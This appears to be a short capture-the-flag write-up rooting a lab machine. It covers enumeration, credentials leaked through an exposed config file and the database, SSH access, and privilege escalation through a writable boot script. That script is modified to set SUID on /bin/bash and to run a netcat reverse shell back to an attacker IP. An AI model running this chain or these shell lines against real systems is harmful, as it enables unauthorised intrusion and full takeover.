nmap shows ports 22, 80, 8082 open
gobuster on port 80 shows mantisbt, adminer endpoints (when used with dirb/big.txt)
gobuster on mantisbt further shows an endpoint /config, which further has an a.txt
This page contains some db creds for mantissuser:password@123AS

We use those creds to loginto adminer

There, in the mantis_users table, we find the entry

|tre|Tr3@123456A!|
So we attempt to ssh with those creds, and we get access
Tre!

---
sudo -l shows /sbin/shutdown can be run by the user, which immeadeately points me to a writable service

so we start to dig for writable files
```zsh
#files that are universal writable
find / -type f -perm 0777 2>/dev/null
#gives nothing

#writable to me
find / -writable -type f 2>/dev/null | grep -iv '\/proc\|\/sys\|\/home'
#gives /usr/bin/check-system

head /usr/bin/check-system
```

```sh
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

while :
do
echo "Checking...";
sleep 1;
done
#This file hopefully starts everytime the system boots up
```

So, we change it to give us a reverse shell. Alternatively, we can also have it grant u+s access to /bin/bash so we get a root shell when we do bash -p.
Let us do both
```sh
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

chmod u+s /bin/bash
mkfifo /tmp/f; nc 192.168.45.201 8082 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f
while :
do
echo "Checking...";
sleep 1;
done
```
